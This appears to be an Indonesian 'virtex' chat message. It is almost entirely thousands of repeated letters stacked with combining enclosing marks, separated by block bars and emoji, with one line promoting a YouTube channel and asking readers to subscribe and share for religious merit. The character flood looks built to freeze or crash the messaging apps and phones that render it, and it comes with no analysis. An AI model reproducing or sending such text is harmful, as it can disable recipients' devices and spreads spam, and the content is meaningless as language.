ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░▒▓█▇▆▅▄▃▂🤼▂▃▄▅▆▇█▓▒░ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░▒▓█▇▆▅▄▃▂▂ *🇮🇩<[HM-Kolaborasi]>🇮🇩* <>[https://www.youtube.com/channel/UCtA4xax8I4DTk7Bv2JsfH7Q?Subscribe_confirmation=1]<> *Bantu subs+view+like+share=PAHALA!* 🤼ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░░▒▓█▇▆▅▄▃▂😳▂▃▄▅▆▇█▓▒░ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░▒▓█▇▆▅▄▃▂🔴▂▃▄▅▆▇█▓▒░ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░▒▓█▇▆▅▄▃▂🐌▂▃▄▅▆▇█▓▒░ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░▒▓█▇▆▅▄▃▂🤣▂▃▄▅▆▇█▓▒░ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ░▒▓█▇▆▅▄▃▂😰🤼ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟